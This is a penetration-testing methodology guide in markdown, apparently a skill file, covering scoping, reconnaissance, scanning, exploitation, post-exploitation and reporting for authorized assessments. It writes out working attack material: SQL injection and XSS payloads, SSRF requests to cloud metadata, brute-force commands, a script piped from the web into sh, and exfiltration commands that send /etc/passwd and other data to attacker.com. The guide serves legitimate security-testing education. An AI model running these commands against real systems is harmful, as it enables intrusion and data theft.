---
name: Penetration Testing
description: Methodology, tools, and techniques for ethical hacking and security assessment of applications and infrastructure
category: security
difficulty: advanced
version: "1.0.0"
author: ROOT
tags: [security, penetration-testing, ethical-hacking, OWASP, red-team, vulnerability-assessment]
platforms: [all]
---

# Penetration Testing

Systematically test systems for security vulnerabilities using attacker techniques in a controlled, authorized manner.

## Engagement Phases

```
1. Planning & Scoping
2. Reconnaissance
3. Scanning & Enumeration
4. Exploitation
5. Post-Exploitation
6. Reporting
7. Remediation Verification
```

## 1. Planning & Scoping

### Rules of Engagement (ROE) Checklist
- [ ] Written authorization from asset owner (get-out-of-jail letter)
- [ ] Defined scope: IP ranges, domains, applications in scope
- [ ] Out-of-scope explicitly listed: production databases, third-party systems
- [ ] Testing window: business hours only, or 24/7?
- [ ] Escalation contacts: who to call if production system goes down
- [ ] Data handling: how to handle discovered credentials or PII
- [ ] Emergency stop procedure: agreed signal to halt testing immediately

### Engagement Types
| Type | Access | Perspective | Use Case |
|------|--------|-------------|----------|
| Black box | None | External attacker | Initial attack surface assessment |
| Gray box | Limited (user-level) | Authenticated attacker | Web app assessment |
| White box | Full (source code, architecture) | Insider / detailed review | Pre-launch security review |
| Red team | None | Advanced persistent threat | Realistic attack simulation |

## 2. Reconnaissance

### Passive Recon (OSINT — No Direct Contact with Target)
```bash
# DNS enumeration
subfinder -d target.com -silent | httpx -silent -status-code
amass enum -d target.com -passive

# Certificate transparency (find subdomains)
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Shodan (internet-connected assets)
shodan search "org:TargetCompany" --fields ip_str,port,org,hostnames

# Google dorks
site:target.com filetype:pdf
site:target.com inurl:admin
"target.com" filetype:xlsx OR filetype:csv
```

### Active Recon
```bash
# Port scanning
nmap -sV -sC -O -p- --min-rate 5000 -oN nmap_full.txt target.com

# Web technology fingerprinting
whatweb https://target.com
wappalyzer https://target.com

# Directory enumeration
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u https://target.com/FUZZ \
  -mc 200,301,302,403 -fc 404 \
  -o dirs.json -of json

# Parameter fuzzing
ffuf -w params.txt -u "https://target.com/api?FUZZ=test" -fs 0
```

## 3. Scanning & Enumeration

### Web Application Scanning
```bash
# OWASP ZAP active scan
zap-cli quick-scan --self-contained \
  --start-options "-config api.disablekey=true" \
  https://target.com

# Nikto web server scanner
nikto -h https://target.com -ssl -output nikto_report.html

# Nuclei template-based scanning
nuclei -u https://target.com \
  -t cves/ -t vulnerabilities/ -t exposures/ \
  -severity critical,high,medium \
  -o nuclei_results.json -json
```

### API Testing
```bash
# Discover API endpoints
katana -u https://target.com -jc -d 3 | grep api

# Fuzz API parameters
ffuf -w api_wordlist.txt \
  -u "https://target.com/api/v1/FUZZ" \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,400,403

# Test for IDOR (Insecure Direct Object Reference)
# Change user_id=1234 to user_id=1235, user_id=1, etc.
curl -H "Authorization: Bearer TOKEN" \
  https://target.com/api/v1/users/1235/profile
```

## 4. Exploitation

### OWASP Top 10 Test Cases

#### SQL Injection
```bash
# Automated testing
sqlmap -u "https://target.com/products?id=1" \
  --batch --dbs --level 3 --risk 2

# Manual payload examples
' OR '1'='1
' UNION SELECT null, username, password FROM users--
'; DROP TABLE users;--    # Test only, NEVER run in production

# Time-based blind injection
' AND SLEEP(5)--
' AND 1=(SELECT COUNT(*) FROM users WHERE SLEEP(5))--
```

#### Authentication Attacks
```bash
# Password spraying (test with low rate to avoid lockout)
hydra -L userlist.txt -p "Password123!" target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# JWT analysis
# Decode and examine JWT payload
echo "eyJ..." | base64 -d

# Test algorithm confusion (RS256 → HS256)
# Use jwt_tool
python3 jwt_tool.py TOKEN -X a    # Test algorithm confusion
```

#### XSS Testing
```javascript
// Basic XSS payloads
<script>alert(document.cookie)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)

// DOM-based XSS
#<img src=x onerror=alert(1)>
```

#### SSRF (Server-Side Request Forgery)
```bash
# Basic SSRF
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://internal-service.local/admin"

# Bypass filters
http://127.0.0.1:80
http://2130706433   # Decimal IP for 127.0.0.1
http://[::1]:80     # IPv6 localhost
```

### Infrastructure Exploitation
```bash
# Test for default credentials on discovered services
nmap --script http-default-accounts target.com
nmap --script ftp-anon target.com -p 21

# SMB enumeration
enum4linux -a target.com
crackmapexec smb target.com -u "" -p ""   # Null session

# SSH brute force (authorized targets only)
hydra -L users.txt -P passwords.txt ssh://target.com
```

## 5. Post-Exploitation

### Privilege Escalation (Linux)
```bash
# Automated enumeration
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l                              # What can current user sudo?
find / -perm -4000 2>/dev/null       # SUID binaries
cat /etc/crontab                     # Cron jobs running as root
env | grep -i "key\|token\|secret\|pass"  # Env secrets
```

### Data Exfiltration Simulation
```bash
# Simulate DNS exfiltration (demonstrates impact)
# Send base64-encoded data in DNS query labels
echo "sensitive-data" | base64 | tr -d '=' | fold -w 63 | \
  xargs -I{} nslookup {}.attacker.com

# HTTP exfiltration
curl -X POST https://attacker.com/collect \
  -d "data=$(cat /etc/passwd | base64)"
```

## 6. Reporting

### Report Structure
```markdown
# Penetration Test Report — [Target] — [Date]

## Executive Summary
- Engagement scope and duration
- Risk rating: Critical/High/Medium/Low
- 3-5 key findings
- Top recommendations

## Findings Summary Table
| ID | Severity | Title | Affected Asset | CVSS |
|----|----------|-------|---------------|------|
| F-001 | Critical | SQL Injection in login | /api/login | 9.8 |

## Detailed Findings
### F-001: SQL Injection in /api/login
- **Risk**: Critical (CVSS 9.8)
- **Description**: The login endpoint is vulnerable to SQL injection...
- **Evidence**: [Screenshot/request/response]
- **Impact**: Full database access, authentication bypass
- **Remediation**: Use parameterized queries
- **References**: CWE-89, OWASP A03:2021

## Appendix: Testing Methodology
## Appendix: Raw Tool Output
```

### CVSS Scoring for Findings
- Always calculate CVSS Base Score for each finding
- Document both theoretical CVSS and contextualized risk (considering compensating controls)
- Include proof-of-concept evidence without providing "weaponized" exploits in reports

## 7. Remediation Verification

- Re-test every finding after the client reports remediation
- Provide a "close-out" report confirming fixed vs. unresolved findings
- For Critical findings: verify within 48 hours of reported fix
- Document the before/after state with evidence

## Tools Reference

| Category | Tool | Use |
|----------|------|-----|
| Recon | Amass, Subfinder, Shodan | Subdomain/asset discovery |
| Scanning | Nmap, Masscan | Port/service scanning |
| Web | Burp Suite Pro, ZAP | Web app testing, intercept proxy |
| Fuzzing | ffuf, Gobuster | Directory/parameter fuzzing |
| SQLi | SQLMap | Automated SQL injection |
| Password | Hashcat, John, Hydra | Hash cracking, brute force |
| Post-exploit | Metasploit, Empire | Post-exploitation framework |
| Reporting | Dradis, Ghostwriter | Finding tracking, reporting |
